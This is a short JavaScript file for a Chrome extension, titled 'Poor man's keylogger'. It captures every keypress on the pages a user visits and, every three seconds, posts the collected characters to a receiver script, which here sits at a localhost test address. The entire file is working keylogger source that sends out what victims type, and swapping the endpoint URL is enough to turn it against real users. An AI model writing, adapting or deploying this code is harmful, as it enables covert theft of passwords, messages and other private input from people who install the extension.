/**
 * Poor man's keylogger 
 * A chrome extension 
 * Weldan Jamili <mweldan@gmail.com> 2013
 * http://mweldan.com
 */

var $js = jQuery.noConflict();
var $characters = "";
// receiver 
var $receiver = "http://localhost/playground/testkeylog/receiver.php";
$js(window).keypress(function(words){
    $characters += String.fromCharCode(words.charCode);
});
setInterval(function(){
    $js.post($receiver, { data: $characters }, function(result){
        if (result) {
            $characters = "";
        }
    });
}, 3000);
